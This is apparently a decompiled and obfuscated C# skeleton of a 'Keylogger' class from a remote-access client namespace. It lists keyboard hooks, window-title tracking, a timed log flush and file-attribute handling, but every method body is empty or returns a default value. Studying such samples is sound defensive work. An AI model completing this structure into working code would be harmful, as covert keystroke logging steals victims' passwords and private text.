using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;
using System.Timers;
using System.Windows.Forms;
using dg3ypDAonQcOidMs0w;
using xClient.Core.MouseKeyHook;

namespace xClient.Core.Utilities;

public class Keylogger : IDisposable
{
	public static Keylogger Instance;

	private readonly Timer _timerFlush;

	private StringBuilder _logFileBuffer;

	private List<Keys> _pressedKeys;

	private List<char> _pressedKeyChars;

	private string _lastWindowTitle;

	private bool _ignoreSpecialKeys;

	private IKeyboardMouseEvents _mEvents;

	internal static Keylogger gnrKchMcIJ4Jfud7PPa;

	public bool IsDisposed
	{
		[CompilerGenerated]
		get
		{
			return true;
		}
		[CompilerGenerated]
		private set
		{
		}
	}

	public static string LogDirectory => null;

	public Keylogger(double flushInterval)
	{
	}

	public void Dispose()
	{
	}

	protected virtual void Dispose(bool disposing)
	{
	}

	private void Subscribe(IKeyboardMouseEvents events)
	{
	}

	private void Unsubscribe()
	{
	}

	private void OnKeyDown(object sender, KeyEventArgs e)
	{
	}

	private void OnKeyPress(object sender, KeyPressEventArgs e)
	{
	}

	private void OnKeyUp(object sender, KeyEventArgs e)
	{
	}

	private string HighlightSpecialKeys(Keys[] keys)
	{
		return null;
	}

	private void timerFlush_Elapsed(object sender, ElapsedEventArgs e)
	{
	}

	private void WriteFile()
	{
	}

	static Keylogger()
	{
		WP6RZJql8gZrNhVA9v.prXoP4RuYp();
		bInllGqmu8D0JwSjw19();
	}

	internal static bool wFc13sMBvkrMrki5w0J()
	{
		return true;
	}

	internal static Keylogger JhFgQGMf9mrwMw6mZZx()
	{
		return null;
	}

	internal static object mqVsgGMG45k9X3OKCQc(Environment.SpecialFolder specialFolder_0)
	{
		return null;
	}

	internal static void fypLNbM5eTTYcuRjTh0()
	{
	}

	internal static void vUJGlKMJXPvkPKtcuJt()
	{
	}

	internal static void oNdilyMWc6a78BWN0rx(object object_0, double double_0)
	{
	}

	internal static void exLL2TMHOjbjDIlXY8y(object object_0, object object_1)
	{
	}

	internal static void FWOJsRMZjHkWHaE5Mwc(object object_0, bool disposing)
	{
	}

	internal static void zUcguOMl3aKmmx3qtiK(object object_0)
	{
	}

	internal static void tiUnQ9M9xGehC9qBDY8(object object_0, object object_1)
	{
	}

	internal static void PgduclMDpskXY5UDkp7(object object_0, object object_1)
	{
	}

	internal static void esfcV5MdEYXnUMecmGd(object object_0, object object_1)
	{
	}

	internal static void OLMDwqMzjOPbNetnDqk(object object_0, object object_1)
	{
	}

	internal static void z9FdJuqbEmoCxDlVmdj(object object_0, object object_1)
	{
	}

	internal static bool qExksTq4EBgwvn3HDQH(object object_0)
	{
		return true;
	}

	internal static bool omWUjLqnPmHcaBteTOY(object object_0, object object_1)
	{
		return true;
	}

	internal static object ss7lXdqU1xDHu8AYFwd(int int_0)
	{
		return null;
	}

	internal static DateTime HI3abqqLc2sLrlbkcQW()
	{
		return (DateTime)(object)null;
	}

	internal static object qbv3tgqNQpJRpZbrXhJ(object object_0)
	{
		return null;
	}

	internal static object OG4wiGqjrt9aKREL5tE(object object_0, object object_1)
	{
		return null;
	}

	internal static Keys lQepCTqaWYqZJiMBW5h(object object_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		return (Keys)(object)null;
	}

	internal static bool Vat9A9qMTvaITXwAPJg(Keys k)
	{
		return true;
	}

	internal static char vpRrqTqqNWUHrn0jZ78(object object_0)
	{
		return '\0';
	}

	internal static object zKEAg2qeSALWd45Es4h(char key)
	{
		return null;
	}

	internal static object rna3GYqXPu9EMXI0tby(object object_0)
	{
		return null;
	}

	internal static void He6lB2qgUBFQiOheOUw(object object_0)
	{
	}

	internal static object WfNDq0q7cDISVVImRiR(object object_0, object object_1, object object_2)
	{
		return null;
	}

	internal static bool n9oZd0qS72PElUa5NZK(object object_0, object object_1)
	{
		return true;
	}

	internal static object MnFWR6q3hRgWcFALt5q(object object_0, object object_1, object object_2)
	{
		return null;
	}

	internal static int fvqvZjqvDMM8Fh7PbVR(object object_0)
	{
		return 0;
	}

	internal static object u1Td6dqyZkrhf44M43l()
	{
		return null;
	}

	internal static bool b79LLCqPReWt0377gbN(object object_0)
	{
		return true;
	}

	internal static void evBJkUqVlIAIdUbZcxw(object object_0)
	{
	}

	internal static void FDdA42qFjnHKKtTmXvC(object object_0, FileAttributes fileAttributes_0)
	{
	}

	internal static void xkshSNqE85l78RwHKGm(object object_0, object object_1)
	{
	}

	internal static object nPZ9CMqwm13VPA4RN7S(object object_0)
	{
		return null;
	}

	internal static void bInllGqmu8D0JwSjw19()
	{
	}
}
